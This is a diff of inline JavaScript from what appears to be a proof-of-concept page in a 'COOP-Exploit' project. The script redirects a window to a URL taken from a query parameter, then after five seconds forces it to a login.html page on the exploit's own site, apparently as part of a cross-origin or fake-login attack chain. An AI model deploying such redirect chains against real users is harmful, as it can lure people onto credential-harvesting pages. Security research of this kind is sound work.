@@ -62,33 +62,21 @@
         function redirectToTarget() {
             const target = getTargetParam();
             if (!target) {
-                console.error("No target parameter found. Aborting redirection.");
+                console.error("No target parameter found. Aborting.");
                 return;
             }
 
             console.log(`Redirecting to: ${target}`);
             window.location.href = target;
 
-            // Store the flag in sessionStorage to remember that we redirected
-            sessionStorage.setItem("redirected", "true");
+            // After 5 seconds, redirect to login.html
+            setTimeout(() => {
+                console.log("Redirecting to login.html...");
+                window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
+            }, 5000);
         }
 
-        function redirectToLogin() {
-            console.log("Redirecting to login.html...");
-            window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
-        }
-
-        function setup() {
-            if (sessionStorage.getItem("redirected")) {
-                // If the page was redirected before, now go to login.html
-                sessionStorage.removeItem("redirected"); // Clean up the flag
-                redirectToLogin();
-            } else {
-                setTimeout(redirectToTarget, 2000); // Redirect to target after 2 seconds
-            }
-        }
-
-        window.onload = setup;
+        window.onload = redirectToTarget;
     </script>
 </head>
 <body>
